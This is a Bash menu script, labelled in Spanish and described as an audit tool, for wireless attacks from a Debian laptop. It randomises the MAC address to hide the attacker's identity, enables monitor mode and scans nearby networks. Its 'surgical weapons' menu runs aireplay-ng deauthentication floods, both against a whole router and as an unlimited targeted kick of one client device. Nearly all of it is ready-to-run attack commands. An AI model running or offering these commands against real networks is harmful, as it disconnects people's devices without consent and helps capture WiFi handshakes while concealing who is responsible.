#!/bin/bash

# --- COLORES ---
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# --- CONFIGURACIÓN ---
WIFI="wlan0"

while true; do
    clear
    echo -e "${BLUE}=================================================${NC}"
    echo -e "${CYAN}      MACBOOK-DEBIAN - AUDIT TOOL V6.2 (FIXED) ${NC}"
    echo -e "${BLUE}=================================================${NC}"

    echo -e "\n${YELLOW}--- PREPARACIÓN (MAC ANONIMIZADA) ---${NC}"
    echo -e "1) MODO RED (Limpio)      2) ${RED}MODO ATAQUE (MAC Fantasma)${NC}"

    echo -e "\n${YELLOW}--- RASTREO DUAL ---${NC}"
    echo "3) SCAN 2.4GHz (bg)       4) SCAN 5GHz (Banda A)"
    echo "5) INFO FABRICANTE MAC"

    echo -e "\n${YELLOW}--- ARMAS QUIRÚRGICAS ---${NC}"
    echo -e "6) DESPERTADOR (ACKs)     7) ${RED}KICK ESPECÍFICO${NC}"

    echo -e "\n${YELLOW}--- SISTEMA ---${NC}"
    echo "8) RESET Y SALIR"
    echo -e "${BLUE}=================================================${NC}"
    read -p "Acción: " opcion

    case $opcion in
        1)
            echo -e "${GREEN}[*] Restaurando MAC real y pidiendo IP...${NC}"
            sudo airmon-ng stop $WIFI >/dev/null 2>&1
            sudo modprobe -r b43 && sudo modprobe b43
            sudo systemctl restart NetworkManager
            echo -e "${YELLOW}Esperando red...${NC}"
            sleep 8
            sudo nmap -sn 192.168.1.0/24
            read -p "ENTER para continuar..." ;;

        2)
            echo -e "${RED}[!] Configurando identidad invisible...${NC}"
            sudo airmon-ng check kill >/dev/null 2>&1
            sudo ip link set $WIFI down
            echo -e "${YELLOW}[*] Cambiando MAC con macchanger...${NC}"
            sudo macchanger -r $WIFI
            sudo iw dev $WIFI set type monitor
            sudo ip link set $WIFI up
            echo -e "${GREEN}[V] Modo Monitor activo y MAC anonimizada.${NC}"
            sleep 2 ;;

        3)
            echo -e "${CYAN}[*] Escaneando 2.4GHz... (Ctrl+C para salir)${NC}"
            sudo airodump-ng --band bg $WIFI ;;

        4)
            echo -e "${CYAN}[*] Escaneando 5GHz (PLUS)... (Ctrl+C para salir)${NC}"
            sudo airodump-ng --band a $WIFI ;;

        5)
            read -p "Introduce la MAC: " target
            vendor=$(curl -s "https://api.macvendors.com/$target")
            echo -e "${CYAN}Fabricante: ${YELLOW}${vendor:-"Desconocido / Privada"}${NC}"
            read -p "ENTER..." ;;

        6)
            read -p "MAC Router: " bssid
            read -p "Canal: " ch
            echo -e "${YELLOW}[!] Fijando canal $ch y enviando ráfaga de 7s...${NC}"
            sudo iw dev $WIFI set channel $ch 2>/dev/null
            sudo timeout 7s aireplay-ng -0 10 -a $bssid --ignore-negative-one $WIFI
            echo -e "${GREEN}[V] Hecho.${NC}"
            sleep 1 ;;

        7)
            read -p "MAC Router: " bssid
            read -p "MAC Objetivo: " target
            read -p "Canal: " ch
            echo -e "${YELLOW}[!] Fijando canal $ch...${NC}"
            sudo iw dev $WIFI set channel $ch 2>/dev/null
            echo -e "${RED}[!] Kick quirúrgico en curso... (Ctrl+C para parar)${NC}"
            # -D sirve para ignorar la comprobación de asociación del driver
            sudo aireplay-ng -0 0 -a $bssid -c $target -D --ignore-negative-one $WIFI ;;

        8)
            echo -e "${GREEN}[*] Limpiando driver b43 y restaurando sistema...${NC}"
            sudo airmon-ng stop $WIFI >/dev/null 2>&1
            sudo modprobe -r b43 && sudo modprobe b43
            sudo systemctl restart NetworkManager
            echo -e "${BLUE}¡Buen hack, McFly!${NC}"
            exit 0 ;;

        *)
            echo -e "${RED}Opción no válida.${NC}"
            sleep 1 ;;
    esac
done
